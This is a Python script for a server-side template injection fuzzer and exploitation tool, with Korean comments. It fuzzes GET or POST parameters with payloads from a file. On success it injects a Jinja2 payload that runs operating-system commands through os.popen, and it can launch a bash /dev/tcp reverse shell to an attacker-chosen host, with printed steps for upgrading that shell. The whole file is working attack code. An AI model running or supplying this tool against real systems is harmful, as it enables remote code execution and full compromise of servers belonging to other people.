import requests
import time
from urllib.parse import urlparse, parse_qsl
import argparse
from colorama import init, Fore, Back, Style

init(autoreset=True)  # print 후 자동으로 리셋

def os_shell(cmd,target_url, method, cookies_dict, copy_parsed_parameter, parsed_key):
    """
    OS Shell Command Execution
    """
    command = f"{{{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}}}"

    if method == "GET":
        copy_parsed_parameter[parsed_key] = command
        response = requests.get(target_url, params=copy_parsed_parameter, cookies=cookies_dict)
    elif method == "POST":
        copy_parsed_parameter[parsed_key] = command
        response = requests.post(target_url, data=copy_parsed_parameter, cookies=cookies_dict)
    else:
        print("Unsupported HTTP method. Use GET or POST.")
        return None
    
    return response.text

def reverse_shell(target_url, method, cookies_dict, copy_parsed_parameter, parsed_key):

    parsed = urlparse(args.reverse_shell)
    reverse_shell_command = f"{{{{ config.__class__.__init__.__globals__['os'].popen(\"bash -c 'bash -i >& /dev/tcp/{parsed.hostname}/{parsed.port} 0>&1'\").read()}}}}"

    if method == "GET":
        copy_parsed_parameter[parsed_key] = reverse_shell_command
        response = requests.get(target_url, params=copy_parsed_parameter, cookies=cookies_dict)
    elif method == "POST":
        copy_parsed_parameter[parsed_key] = reverse_shell_command
        response = requests.post(target_url, data=copy_parsed_parameter, cookies=cookies_dict)
    else:
        print("Unsupported HTTP method. Use GET or POST.")
        return None
    
    return response.text

with open("payloads.txt", encoding="utf-8") as f:
    payloads = [ line.strip() for line in f if line.strip() ]

# 매개변수 파싱
parser = argparse.ArgumentParser(description="SSTI Fuzzer")
parser.add_argument("-u", "--url", type=str, help="Target URL (e.g., http://localhost:5000)", required=True)
parser.add_argument("-m", "--method", type=str, choices=["GET", "POST", "get", "post"], help="HTTP method to use (GET or POST)", required=True)
parser.add_argument("-p", "--parameter", type=str, help="Parameter name to inject (e.g., param_1=1&param_2=2)", required=True)
parser.add_argument("-c", "--cookies", type=str, help="Cookies to send with the request (if any, in the format key=value; key2=value2)", default="", required=False)
parser.add_argument("-d", "--delay", type=int, help="Delay between requests in seconds (default: 0)", default=0, required=False)
parser.add_argument("-r", "--reverse-shell", type=str, help="Reverse shell address (e.g., http://your-reverse-shell-server.com:9000)", default="", required=False)
parser.add_argument("-s", "--shell", action="store_true", help="OS shell command to execute (e.g., ls)")

args = parser.parse_args()
args.method = args.method.upper()  # Method upper로 변환
args.delay = int(args.delay)  # Delay를 정수로 변환

print(f"{Fore.YELLOW}[*] Target URL: {args.url}")
print(f"{Fore.YELLOW}[*] HTTP Method: {args.method}")
print(f"{Fore.YELLOW}[*] Parameter: {args.parameter}")
print(f"{Fore.YELLOW}[*] Cookies: {args.cookies}") if args.cookies else None
print(f"{Fore.YELLOW}[*] Delay: {args.delay}") if args.delay != 0 else None

target_url = args.url
method = args.method
parameter = args.parameter
cookies = args.cookies

# Cookie 파싱
cookies_dict = {}
if cookies:
    for cookie in cookies.split(";"):
        key, value = cookie.strip().split("=", 1)
        cookies_dict[key] = value

# 파라미터 파싱
parsed_parameter = dict(parse_qsl(parameter))
for parsed_key in parsed_parameter.keys():
    copy_parsed_parameter = parsed_parameter.copy()

    # 시도 횟수, 성공 횟수 초기화
    try_exploit_count = 0
    success_exploit_count = 0

    # 페이로드 파싱
    for payload in payloads:
        payload, payload_res = payload.split(",", 1)
        copy_parsed_parameter[parsed_key] = payload

        # Exploit
        if method == "GET":
            response = requests.get(target_url, params=copy_parsed_parameter, cookies=cookies_dict)
            try_exploit_count += 1
        elif method == "POST":
            response = requests.post(target_url, data=copy_parsed_parameter, cookies=cookies_dict)
            try_exploit_count += 1
        else:
            print("Unsupported HTTP method. Use GET or POST.")
            exit(1)

        # 검증 및 로깅
        if payload_res in response.text:
            success_exploit_count += 1
            with open("result.log", "a", encoding="utf-8") as log_file:
                log_file.write(f"Payload: {payload} | Success: true | Parameter: {copy_parsed_parameter}\nResponse: {response.text}\n\n")
        else:
            with open("result.log", "a", encoding="utf-8") as log_file:
                log_file.write(f"Payload: {payload} | Success: false | Parameter: {copy_parsed_parameter}\nResponse: {response.text}\n\n")

        time.sleep(args.delay)  # 요청 사이에 딜레이 적용

    success_rate = (success_exploit_count / try_exploit_count * 100) if try_exploit_count > 0 else 0
    if success_rate > 50:
        print(f"{Fore.GREEN}[+] Try Parameter: {parsed_key} | Try count: {try_exploit_count} | Success count: {success_exploit_count} | Success rate: {success_rate:.2f}%")
        if(args.shell):
            answer = input(f"{Fore.YELLOW}[*] Do you want to execute a shell command? (Y/n): ").strip().lower()
            if answer != "y":
                while(True):
                    command = input(f"{Fore.YELLOW}[*] Enter the shell command to execute(Quit command: q): {Style.RESET_ALL}").strip()
                    if command == "q":
                        break
                    result = os_shell(command, target_url, method, cookies_dict, copy_parsed_parameter, parsed_key)
                    print(f"[=] Shell command result: {result}")
        if(args.reverse_shell):
            answer = input(f"{Fore.YELLOW}[*] Do you want to execute a reverse shell? (Y/n): ").strip().lower()
            if answer != "y":
                print("""
    Reverse Shell Command Execution
    Shell upgrade:
    1. python3 -c 'import pty;pty.spawn("/bin/bash")' 
    2. ctrl+z 
    3. stty raw -echo; fg 
    4. reset 
    5. export TERM=xterm-256color
    """)
                result = reverse_shell(target_url, method, cookies_dict, copy_parsed_parameter, parsed_key)
                print(f"{Fore.YELLOW}[*] Reverse shell finished.")
    elif success_rate <= 50:
        print(f"{Fore.RED}[-] Try Parameter: {parsed_key} | Try count: {try_exploit_count} | Success count: {success_exploit_count} | Success rate: {success_rate:.2f}%")
    


print(f"{Fore.YELLOW}[*] Fuzzing completed. Check log.txt for details.")